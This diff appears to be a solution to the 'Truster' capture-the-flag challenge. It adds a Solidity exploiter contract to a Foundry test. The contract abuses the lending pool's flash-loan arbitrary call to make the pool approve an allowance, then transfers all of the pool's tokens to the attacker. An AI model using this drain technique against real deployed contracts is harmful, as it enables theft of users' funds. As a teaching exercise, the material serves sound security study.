@@ -41,7 +41,10 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        TrusterLenderPoolExploiter exploiter = new TrusterLenderPoolExploiter(trusterLenderPool, dvt, attacker);
+        exploiter.exploit();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -53,5 +56,27 @@ contract Truster is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
         assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
+    }
+}
+
+contract TrusterLenderPoolExploiter {
+    TrusterLenderPool victim;
+    DamnValuableToken dvt;
+    address attacker;
+
+    constructor(TrusterLenderPool _victim, DamnValuableToken _dvt, address _attacker) {
+        victim = _victim;
+        dvt = _dvt;
+        attacker = _attacker;
+    }
+
+    // Make the pool approve the spend of token by the current contract then transfer from pool to
+    // attacker
+    function exploit() external {
+        uint256 tokenAmount = dvt.balanceOf(address(victim));
+        victim.flashLoan(
+            0, address(attacker), address(dvt), abi.encodeCall(dvt.increaseAllowance, (address(this), tokenAmount))
+        );
+        dvt.transferFrom(address(victim), address(attacker), tokenAmount);
     }
 }
